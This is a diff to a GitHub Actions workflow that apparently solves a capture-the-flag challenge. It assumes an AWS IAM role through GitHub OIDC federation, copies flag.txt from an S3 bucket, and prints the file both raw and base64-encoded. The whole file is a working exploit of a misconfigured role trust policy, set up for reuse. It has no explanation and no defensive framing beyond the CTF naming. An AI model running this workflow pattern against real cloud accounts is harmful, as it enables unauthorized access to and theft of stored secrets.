@@ -1,5 +1,4 @@
-name: Grab secret flag
-
+name: Get Flag via OIDC
 on:
   workflow_dispatch:
   push:
@@ -10,24 +9,28 @@ permissions:
   contents: read
 
 jobs:
-  getflag:
+  fetch-flag:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Configure AWS via OIDC (assume target role)
+      - name: Configure AWS credentials via OIDC
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
-          role-session-name: "ctf-grab-flag-${{ github.run_id }}"
-          aws-region: "ap-southeast-1"
+          role-session-name: GitHubActions-Flag-${{ github.run_id }}
+          aws-region: ap-southeast-1
 
-      - name: Show identity (sanity)
-        run: aws sts get-caller-identity
-
-      - name: Download secret flag
+      - name: Try to download and print flag
         run: |
-          aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt --region ap-southeast-1
-          echo "----- FLAG (raw) -----"
-          cat flag.txt
+          echo "attempting s3 cp..."
+          aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt || true
+          echo "---- raw file ----"
+          if [ -f ./flag.txt ]; then
+            cat ./flag.txt || true
+            echo "---- base64 (backup) ----"
+            base64 ./flag.txt || true
+          else
+            echo "flag.txt not present after aws s3 cp (check errors above)."
+          fi
